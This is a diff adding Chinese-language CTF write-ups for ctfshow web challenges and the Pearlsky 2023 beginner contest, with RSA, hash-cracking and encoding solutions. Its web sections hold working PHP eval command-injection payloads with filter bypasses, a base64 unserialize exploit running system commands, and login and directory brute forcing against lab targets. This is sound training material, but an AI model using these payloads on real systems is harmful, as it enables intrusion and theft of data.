@@ -1173,7 +1173,7 @@ $ ./php_mt_seed r=0后得到的数组
 
 ![img](https://cdn.nlark.com/yuque/0/2023/png/39298680/1699868143563-34ef1ed2-d715-4d35-9b97-c3e9ae4a06ae.png)
 
-由于服务器对应php版本是7.3.11，所以我们seed值取2657120068（每一次都不一样），随后使用以下脚本对seed进行解密
+由于服务器对应php版本是7.3.11，所以我们seed值取2657120068（每一次开靶场都不一样），随后使用以下脚本对seed进行解密
 
 ```php+HTML
 <?php
@@ -1195,7 +1195,171 @@ error_reporting(0);
 
 随后即可得到flag
 
+#### web26
 
+对安装界面进行抓包就好了
+
+![img](https://cdn.nlark.com/yuque/0/2023/png/39298680/1699888890631-0c5cd8f6-56ba-4a1f-89f4-e839f519da23.png)
+
+#### web27
+
+先对靶场进行信息收集，可以查询到一个表格，里面有姓名和隐藏日期的身份证号
+
+
+
+![img](https://cdn.nlark.com/yuque/0/2023/png/39298680/1699932149321-a9a02643-2e62-418d-9bce-abba1f719fe6.png)
+
+随后任选其一，进入学籍查询系统，将姓名填入，密码填入后抓包
+
+![img](https://cdn.nlark.com/yuque/0/2023/png/39298680/1699932357079-1cacc32f-8310-4513-9004-2654a659c6d3.png)
+
+可以看到最后一行明文传输用户名和密码，由于身份证格式的问题，所以只需要在*处对日期进行爆破即可，配置payload如下
+
+![img](https://cdn.nlark.com/yuque/0/2023/png/39298680/1699932459711-dc9ade19-4f81-4534-ae93-db7399cb9284.png)
+
+![image-20231114113007601](C:\Users\Luo_bei\Desktop\ctf\01 Markdowns\image-20231114113007601.png)
+
+进行爆破后可以看到19900201项length不同，进行查询即可得到账密，登录即可得到flag
+
+#### web28
+
+文件目录爆破
+
+进入靶场之后进行了重定向，定向到了url/0/1/2.txt，尝试删除.txt发现重定向变成了死循环，无法打开网页，删除2.txt后收到403回应，于是可以确定题目方向为目录爆破，使用burpsuite的集束炸弹模式，设置两个payload型为number，设定范围（0-100）以及step（1）进行爆破后会在一群403中看到一个200，查看回应报文即可得到flag
+
+### 命令执行
+
+#### web29
+
+进入靶场，看到网页运行源代码
+
+```php
+<?php
+error_reporting(0);
+if(isset($_GET['c'])){
+    $c = $_GET['c'];
+    if(!preg_match("/flag/i", $c)){
+        eval($c);
+    }
+    
+}else{
+    highlight_file(__FILE__);
+}
+```
+
+这串代码是一个PHP脚本，用于接收一个名为c的GET参数，并将其作为PHP代码执行
+
+判断是否存在c参数，如果存在，就将其赋值给变量`$c`。
+使用正则表达式检查  `$c`中是否包含flag字符串，如果不包含，就调用eval()函数执行 `$c`中的代码。
+
+eval()函数是一个PHP语言结构，可以将一个字符串作为PHP代码来执行。
+如果不存在c参数，就使用highlight_file()函数显示当前文件的源代码。highlight_file()函数是一个PHP内置函数，可以将一个文件的PHP代码以高亮显示的方式输出。
+
+这道题的关键在于eval()函数，它可以将一个字符串作为php代码执行，于是可以进行php注入
+
+先调用操作系统函数ls对其目录进行扫描
+
+`url/?c=system("ls")`
+
+![img](https://cdn.nlark.com/yuque/0/2023/png/39298680/1700030601828-2912bf33-6fbb-4a53-930f-9c5cb291ce16.png)
+
+发现文件中有flag.php，但是并不能对其直接进行定向，因为之前的代码过滤已经过滤掉了flag字样，当出现flag字符串之后就会被屏蔽掉，那么我们就不能那么直白的对flag进行定向
+
+那么就要用上我们的通配符了
+
+```
+通配符是一类键盘字符。
+当查找文件夹时；当不知道真正字符或者不想键入完整名字时，常常使用通配符代替一个或多个真正字符。
+星号（*）
+可以使用星号代替零个、单个或多个字符。如果正在查找以AEW开头的一个文件，但不记得文件名其余部分，可以输入AEW*，查找以AEW开头的所有文件类型的文件，如AEWT.txt、AEWU.EXE、AEWI.dll等。要缩小范围可以输入AEW*.txt，查找以AEW开头的所有文件类型并.txt为扩展名的文件如AEWIP.txt、AEWDF.txt。
+问号（？）
+可以使用问号代替一个字符。如果输入love？，查找以love开头的一个字符结尾文件类型的文件，如lovey、lovei等。要缩小范围可以输入love？.doc，查找以love开头的一个字符结尾文件类型并.doc为扩展名的文件如lovey.doc、loveh.doc。
+通配符包括星号“*”和问号“？”
+星号表示匹配的数量不受限制，而后者的匹配字符数则受到限制。这个技巧主要用于英文搜索中，如输入““computer*”，就可以找到“computer、computers、computerised、computerized”等单词，而输入“comp？ter”，则只能找到“computer、compater、competer”等单词。
+```
+
+那么这道题就有两种解法
+
+解法一：url/?c=system(“tac fla?.php”);(输入之后引号和空格会自动变成utf-8形式)
+
+解法二：url/?c=system(“tac fla*”);
+
+##### cat：连接多个文件并打印到标准输出。
+
+##### tac：连接多个文件并以行为单位反向打印到标准输出。
+
+随后出现flag
+
+其实cat也不是不能获取，就是这道题很狗，人家把flag放到了最下面，前面都用空格然后超过了显示长度导致cat第一眼看不见，可以试着进源代码，这样就能看见了
+
+#### web30
+
+这道题的解题方法可以继承到上一道题中
+
+```php
+<?php
+error_reporting(0);
+if(isset($_GET['c'])){
+    $c = $_GET['c'];
+    if(!preg_match("/flag|system|php/i", $c)){
+        eval($c);
+    }
+    
+}else{
+    highlight_file(__FILE__);
+}
+```
+
+这道题将system命令过滤了，所以我们就无法将上一道题的方法继承下来了
+
+但是就只需要换一个思路就能解出来这道题，我们可以猜到flag肯定还在老地方，我们只需要更改一下?c的参数即可
+
+改成这样
+
+`url/?c=echo 'tac fla*';`
+
+很好，flag成功出来了
+
+$c = “echo `tac fla*`”;
+
+- 使用eval()函数来执行$c中的代码，eval()函数是一个PHP语言结构，可以将一个字符串作为PHP代码来执行。例如：
+
+eval(“echo `tac fla*`”);
+
+- 使用echo语句来输出一个反引号中的命令的结果，反引号是一种命令替换的方式，可以先执行反引号中的命令，然后将输出结果替换到原来的位置。例如：
+
+echo `tac fla*`;
+
+这个命令的含义是使用tac命令来反向显示以fla开头的文件的内容，tac命令是cat命令的反向版本，可以将文件的内容从最后一行开始显示，这样可以绕过一些过滤规则
+
+#### web31
+
+```php
+<?php
+
+error_reporting(0);
+if(isset($_GET['c'])){
+    $c = $_GET['c'];
+    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'/i", $c)){
+        eval($c);
+    }
+    
+}else{
+    highlight_file(__FILE__);
+}
+```
+
+~~不留活路是吧（怒）~~
+
+你不让我在?c里面干这些事情那我就再定义一个变量，在另外一个变量里面执行操作，我看你还管不管得到我
+
+```php
+url/?c=eval($_GET[a]);&a=system('tac flag.php');
+```
+
+这下我都能不装了摊牌了，老子就是要你的flag你给我不给我拿吧
+
+#### web32
 
 ## CTFSHOW_CAIGOU_WriteUp
 
@@ -1540,4 +1704,505 @@ decode->high
 得到flag
 
 `HITB{CTFFUN}`
+
+## Pearlsky-BeginnersGame 2023
+
+### Crypto
+
+#### 快来签到！
+
+`SVFWI{elqjh_szq_tlqbxdq}`
+
+简单的凯撒密码，去在线解密网站里面将偏移值改成3就好
+
+![img](https://cdn.nlark.com/yuque/0/2023/png/39298680/1700290582682-e815d1f9-04ef-4630-b564-4e947800dd63.png)
+
+好一个pwn
+
+#### easy_rsa
+
+```python
+from Crypto.Util.number import *
+from secret import flag
+
+m = bytes_to_long(flag)
+e = 65537
+p = getPrime(512)
+q = getPrime(512)
+n = p*q
+c = pow(m,e,n)
+
+print(p)
+print(q)
+print(c)
+
+# 8384925867744796153527366818437649735013662531874803670739984568881268846920404769113962724441821224517599325116228918252764292519631593812671744487377507
+# 9414383987932537581962400696785078397778332219689657513384112714031340896076184281169207663246076212324523096276077380200718902731661668334298955818696213
+# 43112607948723112651551543062968118315200985936425454426098221460397002226862970251479688607921791320559197751996109974999936160901845770315346095823691013082208027749241103089394173840338534295300799598132166352013983710851720398402838508021451456877633423118646001865643940555919025793820705936800768130144
+```
+
+简单的rsa解密
+
+```python
+from Crypto.Util.number import *
+
+p = 8384925867744796153527366818437649735013662531874803670739984568881268846920404769113962724441821224517599325116228918252764292519631593812671744487377507
+q = 9414383987932537581962400696785078397778332219689657513384112714031340896076184281169207663246076212324523096276077380200718902731661668334298955818696213
+c = 43112607948723112651551543062968118315200985936425454426098221460397002226862970251479688607921791320559197751996109974999936160901845770315346095823691013082208027749241103089394173840338534295300799598132166352013983710851720398402838508021451456877633423118646001865643940555919025793820705936800768130144
+
+n = p * q
+phi = (p - 1) * (q - 1)
+e = 65537
+d = inverse(e, phi)
+m = pow(c, d, n)
+flag = long_to_bytes(m)
+
+print(flag)
+
+```
+
+解密后得到 
+
+```
+PSCTF{dGhpc19pc190cnVlX2Jhc2U2NA==}
+```
+
+直接提交发现错误，拉入cybercherf后进行magic解密
+
+`this_is_true_base64`
+
+按照格式提交即可
+
+#### 我们也有自己的编码！
+
+```
+密文：
+2053 0226 1412 0171 0048 6008 2589 5261 1569 4104 3024 6357
+
+flag格式：PSCTF{**********ctf**}
+```
+
+
+
+打开文件后发现应该是每四个编码对应一个字符，通过题目描述“我们也有自己的编码”尝试是否为中文编码，上网查询到中文电报码是每4位对应一个字符，解密后可以得到
+
+`我们将来也要有自己的比赛`
+
+按照*填入后提交flag即可
+
+#### 尊嘟假嘟O.o
+
+纯纯整活题
+
+```
+密文：
+Ö.o O.0 Öw0 OvÖ Ö.0 O.o Ö_0 ovÖ o_0 O.O 0w0 0.0 o_o ow0 o.0 0.0 o_o ow0 o.0 0w0 Ö.Ö owO Ö_0 0w0 o.O owO Ö.0 o_Ö Ö_0 0vO Ow0 0w0 Ö_0 owÖ owo 
+```
+
+按照给出的网址进行解密
+
+`PSCTF{this_is_a_fake_flag}`
+
+交上去..是这确实是一个假的
+
+卡了半天才知道
+
+把fake改成true就好了
+
+~~出题人出来挨打~~
+
+#### 小时候最害怕的一集
+
+~段烨出来挨打！！！~
+
+直到出来hint之后才知道该怎么做（离谱的捏）
+
+```
+密文：
+qavbyybqdvhpdrdlhhpdmgiurp
+
+flag格式：单词之间用_隔开
+
+小时候，我们最讨厌写作业了。
+
+那天是开学的前一天晚上，你补作业补到很晚，困意袭来，不知不觉睡着了......
+
+你梦见新学期到来了，你的作业还没完成。
+
+3个老师同时请你喝茶，7个损友在办公室窗户外面偷笑着看你出糗。
+经过风暴洗礼后，老师要求你罚抄15遍《中小学生守则》，最后出办公室前还给了你2个橘子，让你以后不准再这样了。
+
+你醒来了，不禁回味，多美好的童年啊，可你现在已经18岁了。
+```
+
+hint:hill
+
+好好好希尔密码是吧
+
+我们可以知道希尔密码需要四个密钥，但是题目中有五个数字，优先试前四个数字
+
+![img](https://cdn.nlark.com/yuque/0/2023/png/39298680/1700367090544-944b242d-e008-47e5-b36d-9853d7db4a43.png)
+
+黑客不写作业是吧（樂）
+
+#### sevenG0
+
+```python
+import hashlib
+from secret import flag
+
+# Remove head and tail of the flag,check its format and length
+assert flag[:6] == "PSCTF{"
+assert flag[-1:] == "}"
+flag = flag[6:-1]
+assert len(flag) == 12
+
+'''
+
+Hey,bro.Welcome to sevenG0's world!
+
+Now you wander his world,so you want to escape the world.
+
+You have three choices to help you escape the world:
+
+1.Work fastly to decode Choice 1,but this method is busy.
+2.Work simply to decode Choice 2,but this method is inefficient.
+3.Exit this py file,but you will be trapped in the world forever.
+
+If you decode one of Choice 1 and Choice 2,you will get the flag as the key to escape the world.
+
+But you aren't alone because you have a hash cat,maybe it can give you a hand at key times.
+
+Right now,make your choice:
+
+'''
+
+# Choice 1
+print(hashlib.md5(flag[:3].encode()).hexdigest())
+print(hashlib.sha1(flag[3:6].encode()).hexdigest())
+print(hashlib.sha224(flag[6:9].encode()).hexdigest())
+print(hashlib.sha256(flag[9:12].encode()).hexdigest())
+
+'''
+Choice 1 output:
+  74ae88178f23d39281113deece3efa90
+  87250fc4c714cf6b5b472cec4638750c383123e4
+  c7d063991f2a6214b55a9f20060e8db337bdf93821f9ee9821b7fff7
+  2fec9da861d9152a37f0d981446e9fa9874fb94020d68dbbb84484494e4e11cd
+'''
+
+# Choice 2
+print(hashlib.md5(flag[:6].encode()).hexdigest())
+print(hashlib.sha1(flag[6:12].encode()).hexdigest())
+
+'''
+Choice 2 output:
+  dc25504c9e60bad6761171f8e75bdaa6
+  93025d9f4ea0e9d48daa05b794275c25ccc18010
+'''
+
+
+# Choice 3
+print("Waiting for binge's pwn!")
+
+'''
+Choice 3 output:
+  Waiting for binge's pwn!
+'''
+
+```
+
+有够抽象的
+
+两种方法，一种是四个不同的加密方法（md5、sha1、sha224、sha256）对整个flag的12个字符进行加密（一段3个字符），进行爆破即可解出（一定要加上特殊字符）
+
+
+
+另一种方法是一个md5一个sha1解密就行，但是sha1很难解密，所以我用的第一种做的
+
+举例写个代码（sha224）
+
+```python
+import hashlib
+import itertools
+
+def crack_sha224(hash_value, charset, length):
+    combinations = itertools.product(charset, repeat=length)
+    for combination in combinations:
+        guess = ''.join(combination)
+        if hashlib.sha224(guess.encode()).hexdigest() == hash_value:
+            return guess
+    return None
+
+# 使用方法
+hash_value = 'c7d063991f2a6214b55a9f20060e8db337bdf93821f9ee9821b7fff7'
+charset = 'abcdefghijklmnopqrstuvwxyz'
+length = 3
+
+print(crack_sha224(hash_value, charset, length))
+
+```
+
+### web
+
+#### web1-签到
+
+`最基础的信息搜集之我的机器人助手`
+
+显而易见，url/robots.txt
+
+#### web2-签到plus
+
+解法一
+
+```php
+<?php
+header('Content-Type: text/html; charset=utf-8');
+show_source(__FILE__);
+if(!isset($_GET['web2'])||!isset($_POST['fish1'])){
+    echo("不对劲吧大哥...");
+}else{
+    $web2 = $_GET['web2'];
+    $fish1 = $_POST['fish1'];
+    if(is_numeric($fish1)){
+        echo "fish不能是数字！";
+    }else{
+        if($fish1>123456){
+            include($web2);
+        }
+    }
+};
+?> 
+```
+
+分析一下代码
+
+首先判断了GET请求中是否有web2参数，以及POST请求中是否有fish1参数。
+
+如果没有，就输出“不对劲吧大哥…”。
+
+然后if-else语句用于处理web2和fish1参数的值，并且将GET请求中的web2参数赋值随后将POST请求中的fish1参数赋值，
+
+判断fish1是否是一个数字，
+
+如果是，就输出“fish不能是数字！”。跳出循环，判断fish1是否大于123456，如果是就使用include函数，将web2的值作为一个文件名输出
+
+那么我们现在就有两个目标，第一，给予web2一个参数，第二，找一个大于123456的数字赋值给fish1，并且不能通过数字型赋值
+
+![img](https://cdn.nlark.com/yuque/0/2023/png/39298680/1700291629099-15316d0d-e659-4fa5-926e-55d2f5a73366.png)
+
+通了（喜）
+
+随后找文件名
+
+不是flag.php!!!!!!是flag.txt！！！！！！！！！（气死我了）
+
+![img](https://cdn.nlark.com/yuque/0/2023/png/39298680/1700291700707-334a3b52-dc11-489e-95fb-1c34689dde92.png)
+
+~~解法二~~
+
+~~url/flag.txt(樂)~~
+
+#### web3-初学者的破门-EZpop
+
+题目描述
+
+```php
+<?php
+show_source(__FILE__);
+//flag在同目录flag文件中
+class WelcomeZK{
+    public $ClassObj;
+    function __construct(){
+        $this->ClassObj = new pearlsky();
+    }
+    function  __destruct(){
+        $this->ClassObj->action();
+    }
+};
+class pearlsky{
+    public $data;
+    function action(){
+        eval($this->data);
+    }
+};
+if(isset($_POST['0O0Il10O0'])){
+    $a = unserialize(base64_decode($_POST['0O0Il10O0']));
+}else{
+    print_r("POST , OK?");
+};
+?>
+```
+
+可以看出这道题考的是反序列化，先在本地编辑一下代码以便于传参到`0O0Il10O0`
+
+
+
+```php
+php反序列化基本知识
+serialize()     //将一个对象转换成一个字符串
+unserialize()   //将字符串还原成一个对象
+魔术方法：
+__construct()//创建对象时触发
+__destruct() //对象被销毁时触发
+```
+
+以上是这道题所需要的知识点
+
+接下来让我们着重分析一下这道题反序列化的过程
+
+```php
+class WelcomeZK{
+    public $ClassObj;
+    function __construct(){
+        $this->ClassObj = new pearlsky();
+    }
+    function  __destruct(){
+        $this->ClassObj->action();
+    }
+};
+class pearlsky{
+    public $data;
+    function action(){
+        eval($this->data);
+    }
+};
+```
+
+- 首先题目定义了两个类，WelcomeZK和pearlsky，其中WelcomeZK的构造函数会创建一个pearlsky的对象，并赋值给ClassObj属性，而WelcomeZK的析构函数会调用ClassObj的action()方法。
+- pearlsky类有一个data属性，它的action()方法会用eval()函数执行data属性的值
+
+所以这道题的突破点就在eval()函数内可进行系统指令与如何对data进行赋值
+
+我们直接在pearlsky类下对data进行赋值（不在类外进行赋值是为了防止在命令执行之前__destruct()函数就已经将序列化过程中断导致无法对data进行赋值）
+
+```php
+class pearlsky{
+    public $data = "system('ls');";
+    function action(){
+        eval($this->data);
+    }
+};
+```
+
+随后我们建立一个变量a，从而对序列化后的字符串进行输出
+
+`$a = new WelcomeZK();`
+
+到现在我们的脚本是这样的
+
+```php
+<?php
+show_source(__FILE__);
+//flag在同目录flag文件中
+class WelcomeZK{
+    public $ClassObj;
+    function __construct(){
+        $this->ClassObj = new pearlsky();
+    }
+    function  __destruct(){
+        $this->ClassObj->action();
+    }
+};
+class pearlsky{
+    public $data = "system('ls');";
+    function action(){
+        eval($this->data);
+    }
+};
+$a = new WelcomeZK();
+echo serialize($a);
+```
+
+输出后可以得到一串序列化的代码
+
+`O:9:"WelcomeZK":1:{s:8:"ClassObj";O:8:"pearlsky":1:{s:4:"data";s:13:"system('ls');";}}`
+
+当这串代码被post到服务端后就会执行data中的ls命令
+
+但是我们倒回去看源代码
+
+```php
+if(isset($_POST['0O0Il10O0'])){
+    $a = unserialize(base64_decode($_POST['0O0Il10O0']));
+}else{
+    print_r("POST , OK?");
+};
+```
+
+这一段是我们要post data所对应的参数值，但是这串参数已经被base64方法进行了解码，那么我们还需要在我们的脚本中加上base64的encode，防止到最后进行解码时原始的序列化语句无法执行
+
+完整的代码如下
+
+```php
+<?php
+show_source(__FILE__);
+//flag在同目录flag文件中
+class WelcomeZK{
+    public $ClassObj;
+    function __construct(){
+        $this->ClassObj = new pearlsky();
+    }
+    function  __destruct(){
+        $this->ClassObj->action();
+    }
+};
+class pearlsky{
+    public $data = "system('ls');";
+    function action(){
+        eval($this->data);
+    }
+};
+$a = new WelcomeZK();
+echo base64_encode(serialize($a));
+
+
+?>
+```
+
+当我们在本地运行后可以得到以下base64编码
+
+`Tzo5OiJXZWxjb21lWksiOjE6e3M6ODoiQ2xhc3NPYmoiO086ODoicGVhcmxza3kiOjE6e3M6NDoiZGF0YSI7czoxMzoic3lzdGVtKCdscycpOyI7fX0=`
+
+随后我们使用hackbar对参数进行post
+
+![img](https://cdn.nlark.com/yuque/0/2023/png/39298680/1700366463069-2a592377-719c-4815-9495-e4db6ee78894.png)
+
+我们可以发现系统指令已经可以正常调用，并且已经看到flag对应的文件位于何处，接下来我们对脚本进行一点点改动，将系统命令换成`cat flag.txt`后对序列化语句进行base64编码
+
+`Tzo5OiJXZWxjb21lWksiOjE6e3M6ODoiQ2xhc3NPYmoiO086ODoicGVhcmxza3kiOjE6e3M6NDoiZGF0YSI7czoyMzoic3lzdGVtKCdjYXQgZmxhZy50eHQnKTsiO319`
+
+随后按照之前的方法对参数进行传参
+
+![img](https://cdn.nlark.com/yuque/0/2023/png/39298680/1700366653857-a9bf5be6-7ffd-458f-8099-dfa787e99f87.png)
+
+继续努力加油干，欢迎来到Pearlsky（樂）
+
+### Misc
+
+#### misc-1
+
+```
+4B5644453452435749564E444F554C4B4B4A4B45324D4A5A4F425254434F4B554A564444514D43574B553254533D3D3D
+```
+
+明显的16进制，解密后得到以下编码
+
+`KVDE4RCWIVNDOULKKJKE2MJZOBRTCOKUJVDDQMCWKU2TS===`
+
+使用base家族进行解密，挨个试就能得到flag了
+
+#### 抓旭哥
+
+抓的累死我了
+
+第一张图片识图就能知道是横琴码头，随后在剩下的两张图片中可以看到澳门葡京酒店，顺着方向找就可以知道flag
+
+PSCTF{横琴码头+湾仔码头+横琴大桥}
+
+#### 嘀嘀嘀_yylx-part 1
+
+缺了点东西的汉信码，右下角补上就好
+
+![img](https://cdn.nlark.com/yuque/0/2023/png/39298680/1700292220815-bb5d0304-a526-4cad-bbf2-3a7767c46dc0.png)
 
